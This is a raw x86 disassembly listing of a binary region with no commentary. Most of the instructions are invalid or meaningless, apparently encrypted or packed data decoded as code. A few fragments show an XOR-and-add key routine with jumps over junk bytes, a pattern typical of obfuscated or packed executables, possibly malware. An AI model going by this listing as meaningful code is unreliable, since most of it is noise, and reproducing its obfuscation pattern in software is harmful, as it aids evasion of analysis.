  410924:	mov    esi,0x53e32edd
  410929:	call   0x1dc03048
  41092e:	dec    edx
  41092f:	xchg   esp,eax
  410930:	retf   0x37f3
  410933:	adc    ah,0xec
  410936:	ss pop ds
  410938:	sar    DWORD PTR [edx-0x21110c92],1
  41093e:	dec    ebx
  41093f:	inc    eax
  410940:	and    DWORD PTR [ebx+0x6a77133a],edi
  410946:	xor    BYTE PTR [edi-0x65],cl
  410949:	xchg   esi,eax
  41094a:	loop   0x4108cf
  41094c:	leave  
  41094d:	and    BYTE PTR [ecx-0x42],bl
  410950:	add    BYTE PTR [esi],dh
  410952:	xor    ebp,esp
  410954:	test   DWORD PTR [ecx+0x2a6a6d1c],ebx
  41095a:	daa    
  41095b:	call   0xba249257
  410960:	jne    0x410908
  410962:	(bad)  
  410963:	pushf  
  410964:	inc    esi
  410965:	push   esi
  410966:	int    0x48
  410968:	js     0x410983
  41096a:	pop    eax
  41096b:	add    al,0x74
  41096d:	adc    ch,BYTE PTR [ebp+0x3a2569b3]
  410973:	jne    0x410934
  410975:	loope  0x41090a
  410977:	or     al,0x6b
  410979:	les    ebx,FWORD PTR [edx]
  41097b:	test   eax,0x8a26387
  410980:	sahf   
  410981:	(bad)  
  410982:	push   ss
  410983:	inc    sp
  410985:	mov    WORD PTR [esi],?
  410987:	int3   
  410988:	jge    0x41090e
  41098a:	(bad)  
  41098b:	xchg   esp,eax
  41098c:	cwde   
  41098d:	mov    ch,ah
  41098f:	mov    esi,0x9fb79bf8
  410994:	fcmovu st,st(2)
  410996:	add    DWORD PTR ss:[ebx-0x1],ebp
  41099a:	jg     0x41097a
  41099c:	xchg   BYTE PTR [ecx-0x5bd17ff1],bl
  4109a2:	ins    BYTE PTR es:[edi],dx
  4109a3:	lods   al,BYTE PTR ds:[esi]
  4109a4:	jecxz  0x4109a3
  4109a6:	push   ds
  4109a7:	enter  0x375,0x5f
  4109ab:	je     0x410972
  4109ad:	daa    
  4109ae:	sub    al,0xcf
  4109b0:	mov    esp,0xea77f74c
  4109b5:	outs   dx,DWORD PTR ds:[esi]
  4109b6:	cmp    dl,ah
  4109b8:	xor    DWORD PTR [edi-0x5b],ebx
  4109bb:	sbb    al,0x9d
  4109bd:	sub    cl,bh
  4109bf:	sbb    DWORD PTR [eax-0x4a358cd0],0xb3a7841e
  4109c9:	jae    0x410a2e
  4109cb:	or     al,0xce
  4109cd:	std    
  4109ce:	xor    eax,0xbfb64174
  4109d3:	xchg   BYTE PTR [ebx],ah
  4109d5:	push   ecx
  4109d6:	cmp    DWORD PTR [esi+edi*8],ebp
  4109d9:	xchg   ebp,eax
  4109da:	into   
  4109db:	fstp   st(5)
  4109dd:	imul   ecx,DWORD PTR [edx-0x5e1905f5],0x1ad1d2ff
  4109e7:	adc    ecx,esi
  4109e9:	mov    cl,0x4e
  4109eb:	mov    ebp,0xef8fd336
  4109f0:	(bad)  
  4109f2:	dec    esi
  4109f3:	dec    ecx
  4109f4:	mov    eax,0x14819a15
  4109f9:	out    0x14,al
  4109fb:	pop    esi
  4109fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109fd:	and    DWORD PTR [edx-0x22033203],esi
  410a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a04:	cmp    al,0xdd
  410a06:	cmp    ah,BYTE PTR [edi+ebx*4+0x22]
  410a0a:	jmp    0x410995
  410a0c:	into   
  410a0d:	popa   
  410a0e:	jmp    0x3c32d895
  410a13:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  410a15:	inc    edi
  410a16:	or     bh,BYTE PTR [ebp-0x3403121e]
  410a1c:	call   0x46a7:0x4c4df73c
  410a23:	jge    0x4109af
  410a25:	mov    ebp,0x20905697
  410a2a:	ret    0x2528
  410a2d:	sub    esp,DWORD PTR [esi-0x50617920]
  410a33:	add    cl,0x9d
  410a36:	mov    edx,0x3ad5dc54
  410a3b:	xchg   DWORD PTR [ebx],esi
  410a3d:	ror    DWORD PTR [eax+edx*8-0x630132db],cl
  410a44:	xor    ch,BYTE PTR [ebx]
  410a46:	sub    ebp,esi
  410a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a49:	sbb    cl,BYTE PTR [eax+0x7035be01]
  410a4f:	dec    edi
  410a50:	clc    
  410a51:	and    ah,bh
  410a53:	es cmc 
  410a55:	enter  0xab73,0xd4
  410a59:	and    ebx,eax
  410a5b:	and    eax,0xfd47e89
  410a60:	and    esi,DWORD PTR [ecx-0x2b143661]
  410a66:	mov    ch,0x4b
  410a68:	outs   dx,DWORD PTR ds:[esi]
  410a69:	inc    eax
  410a6a:	mov    esi,0x24c044d2
  410a6f:	inc    edi
  410a70:	push   edx
  410a71:	shl    al,0x18
  410a74:	fdiv   DWORD PTR fs:[di+0x59]
  410a79:	adc    DWORD PTR [edi],ecx
  410a7b:	mov    edi,0xb61b86cf
  410a80:	and    BYTE PTR [ecx+ecx*4],0xf
  410a84:	fwait
  410a85:	pushf  
  410a86:	sbb    al,0x68
  410a88:	int    0x9f
  410a8a:	gs push esp
  410a8c:	call   0xce9f559
  410a91:	add    al,0xc
  410a93:	sbb    esi,DWORD PTR [eax+0x4f9178c8]
  410a99:	ja     0x410a2b
  410a9b:	arpl   WORD PTR [ebp+0x37],sp
  410a9e:	out    dx,al
  410a9f:	std    
  410aa0:	pop    ss
  410aa1:	jo     0x410a57
  410aa3:	pop    ebx
  410aa4:	jnp    0x410abd
  410aa6:	aas    
  410aa7:	push   ebp
  410aa8:	push   ss
  410aa9:	jl     0x410aec
  410aab:	ds push esi
  410aad:	shl    DWORD PTR [eax],0xc7
  410ab0:	dec    edi
  410ab1:	inc    esp
  410ab2:	inc    esi
  410ab3:	arpl   WORD PTR [eax-0x4],ax
  410ab6:	enter  0xb032,0x3f
  410aba:	mov    esi,esp
  410abc:	je     0x410a3f
  410abe:	adc    DWORD PTR [edi-0x483a34e1],esi
  410ac4:	dec    esp
  410ac5:	imul   eax,DWORD PTR [edx+ebx*4-0x624a3556],0xffffffb1
  410acd:	cli    
  410ace:	imul   ecx,DWORD PTR [edi+0x5f],0x18
  410ad2:	push   esi
  410ad3:	sbb    ch,bl
  410ad5:	adc    BYTE PTR [ebx+eax*8-0xa],al
  410ad9:	aad    0x6d
  410adb:	js     0x410ab7
  410add:	cli    
  410ade:	enter  0xf5d9,0xf8
  410ae2:	xor    al,0x64
  410ae4:	push   ss
  410ae5:	js     0x410b46
  410ae7:	dec    esi
  410ae8:	out    dx,al
  410ae9:	dec    eax
  410aea:	jp     0x410a86
  410aec:	js     0x410acf
  410aee:	pop    es
  410aef:	fist   DWORD PTR [ecx-0x5f]
  410af2:	and    eax,0x4414c1e9
  410af7:	ja     0x410b0c
  410af9:	jbe    0x410b60
  410afb:	mov    ebp,0xb8f7ed81
  410b00:	sti    
  410b01:	jnp    0x410a8e
  410b03:	adc    BYTE PTR [eax+ecx*8+0x11],0x93
  410b08:	mov    al,0x11
  410b0a:	sub    BYTE PTR [eax],dh
  410b0c:	push   DWORD PTR [eax-0x6a]
  410b0f:	pop    ds
  410b10:	pop    esi
  410b11:	pop    ebp
  410b12:	pop    edx
  410b13:	shl    edx,1
  410b15:	fs sub edi,ebp
  410b18:	cmc    
  410b19:	clc    
  410b1a:	xchg   edx,eax
  410b1b:	add    DWORD PTR [ebp+0x68],ebx
  410b1e:	fdiv   DWORD PTR [edx+0xd53567d]
  410b24:	cmp    eax,0xee5f242
  410b29:	loopne 0x410ba7
  410b2b:	fistp  DWORD PTR fs:[esi+0xd]
  410b2f:	test   bl,dl
  410b31:	cmp    DWORD PTR [edx+0x2b3554a],0xffffffe3
  410b38:	jmp    0x410b45
  410b3a:	iret   
  410b3b:	ja     0xd0e8b61e
  410b41:	mov    esp,0x4088ca2f
  410b46:	imul   BYTE PTR [edi+esi*1-0x68764d43]
  410b4d:	sub    ch,cl
  410b4f:	add    edx,DWORD PTR [edx+0x2c]
  410b52:	adc    ch,cl
  410b54:	add    al,0x8f
  410b56:	not    DWORD PTR [ebp+0x22d9541a]
  410b5c:	imul   esi,DWORD PTR [ebx-0x44],0x46390878
  410b63:	push   esp
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ba5:	cmp    dl,BYTE PTR [esi-0x52]
  410ba8:	ds inc edx
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410c14
  410bb1:	mov    dh,0x0
  410bb3:	xchg   BYTE PTR [ebx+ecx*4-0x1516c186],ah
  410bba:	pop    ecx
  410bbb:	ret    
  410bbc:	mov    ebp,0x62b0c45a
  410bc1:	add    BYTE PTR [edx],al
  410bc3:	rol    BYTE PTR [ebx+0x20],1
  410bc6:	xor    al,0x20
  410bc8:	stc    
  410bc9:	arpl   WORD PTR [edi],di
  410bcb:	adc    BYTE PTR [eax],bh
  410bcd:	sub    edi,esi
  410bcf:	dec    ebx
  410bd0:	pop    es
  410bd1:	sub    esp,DWORD PTR ds:0xf1bc760d
  410bd7:	lods   al,BYTE PTR ds:[esi]
  410bd8:	jo     0x410c3a
  410bda:	mov    esp,ebx
  410bdc:	(bad)  
  410bdd:	fsubr  DWORD PTR [ecx+0x236f219a]
  410be3:	cmp    ebp,0xf8f31c9f
  410be9:	jg     0x410baf
  410beb:	rol    BYTE PTR [esi-0x71],0xc3
  410bef:	xchg   ebp,eax
  410bf0:	lea    esp,[esi]
  410bf2:	adc    eax,0x8f704816
  410bf7:	sub    al,0xab
  410bf9:	fst    QWORD PTR ds:0x23665dc
  410bff:	push   esp
  410c00:	sub    esp,eax
  410c02:	inc    ecx
  410c03:	jecxz  0x410ba5
  410c05:	mov    cl,0xee
  410c07:	add    BYTE PTR [edx-0xa5659a1],cl
  410c0d:	mov    ?,WORD PTR [edx-0x319f2c73]
  410c13:	jae    0x410c61
  410c15:	iret   
  410c16:	in     eax,0xd2
  410c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c19:	pop    esp
  410c1a:	or     al,0x57
  410c1c:	enter  0xb7f6,0xa0
  410c20:	pushf  
  410c21:	out    dx,eax
  410c22:	shr    bl,0x38
  410c25:	xchg   ebp,eax
  410c26:	iret   
  410c27:	jcxz   0x410bbe
  410c2a:	fwait
  410c2b:	or     BYTE PTR [ebx-0x65],0x9d
  410c2f:	mov    al,0xc9
  410c31:	inc    esi
  410c32:	or     DWORD PTR [edx+0x5d68ecbd],ebx
  410c38:	push   esi
  410c39:	pop    edi
  410c3a:	mov    WORD PTR [eax-0x75a84f9c],?
  410c40:	or     eax,0x9850da74
  410c45:	shr    DWORD PTR [ecx+edx*2],1
  410c48:	xor    eax,esi
  410c4a:	jle    0x410cb0
  410c4c:	fdivr  QWORD PTR [eax-0x25efca78]
  410c52:	jno    0x410c9c
  410c54:	scas   al,BYTE PTR es:[edi]
  410c55:	mov    dl,0x12
  410c57:	fistp  QWORD PTR [edx-0x8]
  410c5a:	mov    ebp,DWORD PTR [ebx-0x4a9fdd95]
  410c60:	push   edi
  410c61:	stos   DWORD PTR es:[edi],eax
  410c62:	and    eax,0x40bbc6dc
  410c67:	and    dl,BYTE PTR [ebx]
  410c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c6a:	mov    eax,0x1fb1ff41
  410c6f:	std    
  410c70:	and    eax,0x28486e60
  410c75:	mov    dh,0x41
  410c77:	std    
  410c78:	arpl   WORD PTR [eax+0x1a],dx
  410c7b:	pop    ebp
  410c7c:	iret   
  410c7d:	mov    ds:0xec59a76a,al
  410c82:	xor    DWORD PTR [esi+eiz*4-0x1db22732],0x1d4dd48
  410c8d:	and    edx,ecx
  410c8f:	cmp    ebx,edi
  410c91:	pushf  
  410c92:	jmp    0xa0e223ce
  410c97:	push   es
  410c98:	sar    DWORD PTR [edi+edi*1+0x2bb6f23b],1
  410c9f:	push   esp
  410ca0:	dec    esp
  410ca1:	push   cs
  410ca2:	sbb    eax,0xdcbf9f6f
  410ca7:	popf   
  410ca8:	xor    esp,DWORD PTR [edx+0x16920edd]
  410cae:	and    BYTE PTR [esi],bh
  410cb0:	inc    ecx
  410cb1:	into   
  410cb2:	mov    ch,0x45
  410cb4:	xchg   edx,eax
  410cb5:	push   esi
  410cb6:	xor    BYTE PTR ds:[ebx-0x5a],ah
  410cba:	lock or eax,0xee8f331c
  410cc0:	int    0xde
  410cc2:	dec    edi
  410cc3:	loope  0x410cef
  410cc5:	and    DWORD PTR [ebx-0x39170c7d],eax
  410ccb:	mov    DWORD PTR [ecx-0x4a5814ee],ebp
  410cd1:	push   ebx
  410cd2:	jns    0x410ce0
  410cd4:	sar    BYTE PTR [eax],1
  410cd6:	pop    ss
  410cd7:	jl     0x410ce1
  410cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cda:	jo     0x410d1d
  410cdc:	or     eax,edx
  410cde:	pop    edi
  410cdf:	sbb    al,0x92
  410ce1:	ss data16 das 
  410ce4:	fld    TBYTE PTR [ecx]
  410ce6:	sar    DWORD PTR [ebx],1
  410ce8:	cmp    esi,DWORD PTR [edx]
  410cea:	popa   
  410ceb:	jo     0x410ccf
  410ced:	xor    al,0x26
  410cef:	jg     0x410cfd
  410cf1:	cld    
  410cf2:	push   ds
  410cf3:	call   0xe29255b2
  410cf8:	mov    ch,0xf7
  410cfa:	inc    ebx
  410cfb:	aas    
  410cfc:	xchg   BYTE PTR [esi+0x56],al
  410cff:	pop    esp
  410d00:	or     BYTE PTR [ecx-0x2e],al
  410d03:	int    0xc
  410d05:	mov    edi,0xc45847ec
  410d0a:	outs   dx,BYTE PTR ds:[esi]
  410d0b:	mov    ebp,0xfd06898a
  410d10:	in     eax,dx
  410d11:	out    dx,al
  410d12:	jbe    0x410d7f
  410d14:	push   esi
  410d15:	pop    edx
  410d16:	lea    ebx,[ebx]
  410d18:	out    0x6d,al
  410d1a:	sti    
  410d1b:	pop    eax
  410d1c:	and    ah,dl
  410d1e:	aaa    
  410d1f:	inc    ecx
  410d20:	push   edx
  410d21:	sti    
  410d22:	cmc    
  410d23:	push   eax
  410d24:	pop    eax
  410d25:	mov    ch,0x55
  410d27:	xlat   BYTE PTR ds:[ebx]
  410d28:	jge    0x410d37
  410d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d2b:	mul    DWORD PTR [ecx]
  410d2d:	rcr    DWORD PTR [eax+0x2c],cl
  410d30:	jmp    DWORD PTR [edx]
  410d32:	and    eax,0xe0bf101
  410d37:	(bad)  
  410d38:	arpl   WORD PTR [ebp+0x1e],di
  410d3b:	push   edi
  410d3c:	add    BYTE PTR [eax-0xe],ah
  410d3f:	stos   BYTE PTR es:[edi],al
  410d40:	mov    bl,0x3f
  410d42:	pop    edx
  410d43:	lock ins BYTE PTR es:[edi],dx
  410d45:	pop    ebx
  410d46:	xor    eax,0x272bba5f
  410d4b:	aad    0x95
  410d4d:	xchg   BYTE PTR [ebx+0x5c0648aa],dl
  410d53:	inc    esi
  410d54:	xor    eax,0x2131c9fc
  410d59:	mov    ch,0x67
  410d5b:	jge    0x410d89
  410d5d:	iret   
  410d5e:	push   esp
  410d5f:	or     eax,0xaafb600c
  410d64:	shl    BYTE PTR [ebx],cl
  410d66:	push   0x68fe1713
  410d6b:	call   0xa178:0xe61a66fd
  410d72:	xchg   ebx,eax
  410d73:	stc    
  410d74:	xchg   BYTE PTR [edi],dh
  410d76:	shl    BYTE PTR [edi-0x75],cl
  410d79:	(bad)  
  410d7a:	out    dx,eax
  410d7b:	mov    dh,0xd
  410d7d:	sbb    eax,0xbd7c937c
  410d82:	nop
  410d83:	jne    0x410de0
  410d85:	or     al,0xe4
  410d87:	push   edx
  410d88:	int    0x58
  410d8a:	fld    QWORD PTR [ebp+0x1bdb836b]
  410d90:	lahf   
  410d91:	fidivr DWORD PTR [eax-0x74a3fe30]
  410d97:	int    0xbc
  410d99:	addr16 or al,0x7c
  410d9c:	mov    esp,ds
  410d9e:	mov    ebp,DWORD PTR [ebx+0x57]
  410da1:	push   esp
  410da2:	add    al,0x3c
  410da4:	cmc    
  410da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410da6:	in     eax,dx
  410da7:	or     esp,esi
  410da9:	cwde   
  410daa:	push   edi
  410dab:	jb     0x410d61
  410dad:	sub    DWORD PTR [ebx+0x47c92659],0x74
  410db4:	dec    ecx
  410db5:	mov    ebp,0xac77922f
  410dba:	dec    ecx
  410dbb:	pop    ebp
  410dbc:	mov    dl,0xe4
  410dbe:	ss loopne 0x410d8b
  410dc1:	rcr    sp,0xb0
  410dc5:	add    BYTE PTR [ebx+0x243a549d],ch
  410dcb:	sub    DWORD PTR [edi+0x5d],edi
  410dce:	push   ebx
  410dcf:	push   DWORD PTR [ebx+eiz*1]
  410dd2:	xor    eax,0xbe2997b6
  410dd7:	inc    edx
  410dd8:	ret    0x3160
  410ddb:	in     eax,dx
  410ddc:	outs   dx,BYTE PTR cs:[esi]
  410dde:	mov    edi,0x9eb1b068
  410de3:	add    al,0xd8
  410de5:	sbb    esp,DWORD PTR [ecx]
  410de7:	push   ecx
  410de8:	xchg   ebp,eax
  410de9:	das    
  410dea:	sti    
  410deb:	mov    eax,0x77dfe722
  410df0:	pop    eax
  410df1:	sbb    al,0xfb
  410df3:	sbb    DWORD PTR [ebx-0x3ab4e69b],ebp
  410df9:	addr16 popf 
  410dfb:	adc    eax,0x73021dd7
  410e00:	cmp    dl,dh
  410e02:	mov    bl,0xb7
  410e04:	or     DWORD PTR [esi-0x22441e31],0xc6d8b257
  410e0e:	mov    bl,0xca
  410e10:	cwde   
  410e11:	sbb    cl,0xee
  410e14:	pushf  
  410e15:	cld    
  410e16:	cmp    al,BYTE PTR [edi+eiz*4-0x39]
  410e1a:	or     al,0xc5
  410e1c:	jo     0x410e51
  410e1e:	lea    ebp,[edi]
  410e20:	add    esi,DWORD PTR [edi+0x19]
  410e23:	loop   0x410dce
  410e25:	pop    edx
  410e26:	mov    edx,0x9d49c653
  410e2b:	out    dx,eax
  410e2c:	xchg   esi,eax
  410e2d:	xchg   esp,eax
  410e2e:	jae    0x410dca
  410e30:	xchg   edx,eax
  410e31:	and    DWORD PTR [edx+0x38276500],edi
  410e37:	(bad)  
  410e38:	test   BYTE PTR [edi-0x6e],0xe1
  410e3c:	mov    ss,esp
  410e3e:	sub    DWORD PTR [esi-0x1f],0x99766ba5
  410e45:	and    bl,dh
  410e47:	fisub  WORD PTR [ebx-0x68]
  410e4a:	push   ebx
  410e4b:	fdiv   DWORD PTR [eax]
  410e4d:	imul   edx,DWORD PTR [edx],0x54
  410e50:	push   ebp
  410e51:	or     al,0x80
  410e53:	cmp    eax,0x5a6dd840
  410e58:	mov    dh,BYTE PTR [ebp-0x121c0d61]
  410e5e:	bound  edx,QWORD PTR [edx]
  410e60:	scas   al,BYTE PTR es:[edi]
  410e61:	cli    
  410e62:	push   es
  410e63:	je     0x410eda
  410e65:	pop    ss
  410e66:	push   0xb9bdc3ac
  410e6b:	cdq    
  410e6c:	sub    al,0x2e
  410e6e:	daa    
  410e6f:	retf   
  410e70:	fs dec esp
  410e72:	inc    edx
  410e73:	sbb    eax,0x4cc7f819
  410e78:	mov    eax,DWORD PTR [eax+0x4f]
  410e7b:	out    dx,al
  410e7c:	adc    ch,ch
  410e7e:	rcr    BYTE PTR [ecx+0x29a0fcda],1
  410e84:	jge    0x410e27
  410e86:	test   BYTE PTR [edx-0x38],dh
  410e89:	dec    esp
  410e8a:	into   
  410e8b:	add    edi,ebp
  410e8d:	ret    0x2dd1
  410e90:	inc    ecx
  410e91:	add    al,BYTE PTR [edx+edx*2]
  410e94:	call   0xef4ab6fe
  410e99:	sbb    DWORD PTR [ebp+0x3564ba35],esi
  410e9f:	inc    edi
  410ea0:	adc    al,BYTE PTR [ebx+0x14]
  410ea3:	clc    
  410ea4:	push   esi
  410ea5:	out    0xe0,al
  410ea7:	int3   
  410ea8:	fidiv  WORD PTR [ebx]
  410eaa:	push   es
  410eab:	pop    eax
  410eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ead:	popa   
  410eae:	add    edx,DWORD PTR [ebp+ebp*1-0xc]
  410eb2:	lock stos DWORD PTR es:[edi],eax
  410eb4:	sub    ecx,edi
  410eb6:	int    0x55
  410eb8:	enter  0x127f,0x8a
  410ebc:	clc    
  410ebd:	xor    esp,0x35
  410ec0:	ror    DWORD PTR [ebx+0x18679225],cl
  410ec6:	leave  
  410ec7:	sbb    edx,DWORD PTR [ecx+0x6c]
  410eca:	clc    
  410ecb:	(bad)  
  410ecc:	retf   
  410ecd:	(bad)  
  410ece:	pop    eax
  410ecf:	sub    edi,DWORD PTR [edi*1+0x7141889d]
  410ed6:	xchg   ebx,eax
  410ed7:	mov    ?,WORD PTR [ebp-0x4d]
  410eda:	enter  0xc4e6,0x1f
  410ede:	ss addr16 xchg esi,eax
  410ee1:	cmp    BYTE PTR [ebx+0x3a913269],dl
  410ee7:	in     eax,dx
  410ee8:	push   ebp
  410ee9:	sub    BYTE PTR ds:0x2effe271,cl
  410eef:	and    BYTE PTR [esi+ecx*4+0x49],0x6f
  410ef4:	mov    al,0x3b
  410ef6:	inc    ecx
  410ef7:	add    DWORD PTR [edi+edx*8+0x40],0xd7bacb37
  410eff:	das    
  410f00:	test   DWORD PTR [edi+0x51cd3359],0x5c989b36
  410f0a:	mov    edi,0xe8fa6086
  410f0f:	ss ins BYTE PTR es:[edi],dx
  410f11:	in     al,0xef
  410f13:	test   DWORD PTR es:[esi+0x7198d5e],esp
  410f1a:	cmp    BYTE PTR ss:[ebx-0x4b],al
  410f1e:	int3   
  410f1f:	or     DWORD PTR [ebx+0x4338a904],ecx
  410f25:	mov    ch,0xc
  410f27:	rol    DWORD PTR [ebp-0x13],0x5a
  410f2b:	sbb    eax,0x1b83832f
  410f30:	jo     0x410f53
  410f32:	shl    DWORD PTR [esi+0x2c1d1e50],cl
  410f38:	adc    eax,0xf6d7f71b
  410f3d:	mov    eax,ds:0x72b4527a
  410f42:	jno    0x410f30
  410f44:	imul   DWORD PTR [esi-0x140b2efc]
  410f4a:	sar    DWORD PTR [edx-0xbb20c],1
  410f50:	dec    edi
  410f51:	cmp    ebp,DWORD PTR [edx]
  410f53:	xor    bh,dh
  410f55:	sub    DWORD PTR [ebp-0x4],ebx
  410f58:	and    al,0x4
  410f5a:	mov    bl,0xef
  410f5c:	pop    eax
  410f5d:	daa    
  410f5e:	in     al,0x67
  410f60:	xchg   esi,eax
  410f61:	jp     0x410eef
  410f63:	loopne 0x410f95
  410f65:	pushf  
  410f66:	xchg   ebp,eax
  410f67:	je     0x410fb4
  410f69:	mov    dl,0x78
  410f6b:	and    ebp,DWORD PTR [eax-0x1ab64d84]
  410f71:	fcomp  st(3)
  410f73:	sub    edx,DWORD PTR [esi+0x2c]
  410f76:	fsub   QWORD PTR [eax]
  410f78:	retf   0x44c7
  410f7b:	adc    al,0x35
  410f7d:	fmulp  st(4),st
  410f7f:	or     ch,BYTE PTR [edi+0xd95d56b]
  410f85:	out    0x81,eax
  410f87:	sub    ah,BYTE PTR [edi-0x77]
  410f8a:	or     esi,DWORD PTR [edi-0x6a]
  410f8d:	mov    eax,ds:0x14fb4192
  410f92:	mov    eax,ds:0x260b2a9
  410f97:	ins    DWORD PTR es:[edi],dx
  410f98:	mov    eax,ds:0x41b22c
  410f9d:	mov    edx,0x32729c
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x685a81c6]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x410fa4
  410fdd:	mov    BYTE PTR [eax+0x7ec15f88],0x3b
  410fe4:	add    BYTE PTR [eax],al
  410fe6:	mov    ecx,0x72f164a6
  410feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fec:	adc    al,0x17
  410fee:	jmp    DWORD PTR [edx+0xa]
  410ff1:	add    DWORD PTR [edx-0x79],edi
  410ff4:	into   
  410ff5:	(bad)  
  410ff7:	push   ds
  410ff8:	test   eax,0x7cd8adf1
  410ffd:	push   ebx
  410ffe:	rol    esi,1
  411000:	push   ds
  411001:	mov    esi,0xfb603aca
  411006:	fidiv  WORD PTR [ecx-0x74]
  411009:	and    esi,esi
  41100b:	xchg   esp,eax
  41100c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41100d:	ins    DWORD PTR es:[edi],dx
  41100e:	jb     0x410fa3
  411010:	xchg   edx,eax
  411011:	fsub   DWORD PTR [eax+0x39]
  411014:	cmp    eax,edx
  411016:	das    
  411017:	jnp    0x410fd2
  411019:	pop    eax
  41101a:	sub    DWORD PTR [esi],0xffffffb6
  41101d:	in     eax,dx
  41101e:	jg     0x41106f
  411020:	in     al,0x75
  411022:	jae    0x41105f
  411024:	pop    edx
  411025:	pusha  
  411026:	pop    ds
  411027:	adc    eax,0x956446ee
  41102c:	inc    esi
  41102d:	stc    
  41102e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41102f:	and    bl,BYTE PTR [ecx]
  411031:	mov    BYTE PTR [ecx],cl
  411033:	xor    DWORD PTR [ebx+0x4],ecx
  411036:	inc    eax
  411037:	jmp    0x41105b
  411039:	fs pop ss
  41103b:	mov    ch,0x6f
  41103d:	dec    ebx
  41103e:	lahf   
  41103f:	jmp    0x9ddbd525
  411044:	inc    edi
  411045:	sbb    bl,BYTE PTR [ecx]
  411047:	clc    
  411048:	(bad)  
  411049:	and    eax,0x60341504
  41104e:	daa    
  41104f:	and    cl,BYTE PTR [ecx+0x2ac22e5]
  411055:	scas   al,BYTE PTR es:[edi]
  411056:	shl    esp,cl
  411058:	mov    ebx,0x32cb8e37
  41105d:	cwde   
  41105e:	dec    esi
  41105f:	ins    DWORD PTR es:[edi],dx
  411060:	mov    bh,0x99
  411062:	cs icebp 
  411064:	push   ss
  411065:	xor    BYTE PTR [edi+edx*2+0x36],ah
  411069:	and    eax,0xd59e9ae2
  41106e:	mov    bh,0xc
  411070:	fst    DWORD PTR [edx+0x2b]
  411073:	fwait
  411074:	add    DWORD PTR [esi-0x215e3d51],esi
  41107a:	adc    ebp,esp
  41107c:	leave  
  41107d:	or     esi,edx
  41107f:	stos   DWORD PTR es:[edi],eax
  411080:	mov    ah,0xe
  411082:	scas   eax,DWORD PTR es:[edi]
  411083:	js     0x41104b
  411085:	xchg   esi,eax
  411086:	retf   0x8009
  411089:	daa    
  41108a:	xor    eax,0x7f36f268
  41108f:	leave  
  411090:	mov    esi,0x740e9beb
  411095:	test   al,0x75
  411097:	outs   dx,BYTE PTR ds:[esi]
  411098:	push   edi
  411099:	in     al,dx
  41109a:	test   al,0x1d
  41109c:	scas   eax,DWORD PTR es:[edi]
  41109d:	nop
  41109e:	es enter 0xe48c,0x77
  4110a3:	mov    esp,0x125c0311
  4110a8:	cmp    DWORD PTR [edi+edx*4+0x11bf9df8],0xfffffff2
  4110b0:	lock jnp 0x41107e
  4110b3:	add    edi,DWORD PTR [ecx]
  4110b5:	sub    DWORD PTR [eax+0x73],edx
  4110b8:	pusha  
  4110b9:	xchg   esi,eax
  4110ba:	jo     0x411054
  4110bc:	dec    edx
  4110bd:	or     eax,DWORD PTR [ecx+0x8]
  4110c0:	jp     0x411136
  4110c2:	sbb    al,0xe3
  4110c4:	dec    edx
  4110c5:	add    BYTE PTR [eax+0x8992185],bl
  4110cb:	xchg   ebx,eax
  4110cc:	pop    eax
  4110cd:	mov    DWORD PTR [ebx+0x26dd285b],edx
  4110d3:	dec    edx
  4110d4:	ins    DWORD PTR es:[edi],dx
  4110d5:	(bad)  
  4110d6:	cmp    eax,0xc81e7cd1
  4110db:	mov    al,ds:0x31426be9
  4110e0:	nop
  4110e1:	call   0x7c3362bf
  4110e6:	xor    eax,DWORD PTR [ecx]
  4110e8:	(bad)  
  4110e9:	sub    al,0x1e
  4110eb:	fmul   DWORD PTR [ebx+ebx*4+0x2c]
  4110ef:	push   DWORD PTR [esi-0xe]
  4110f2:	pusha  
  4110f3:	jnp    0x411143
  4110f5:	dec    edx
  4110f6:	jmp    0x41107d
  4110f8:	jg     0x411138
  4110fa:	add    edx,DWORD PTR [esi+0x17]
  4110fd:	out    0xae,al
  4110ff:	std    
  411100:	xchg   edx,eax
  411101:	aas    
  411102:	and    edx,DWORD PTR [edi+ecx*2-0x42]
  411106:	push   eax
  411107:	push   esi
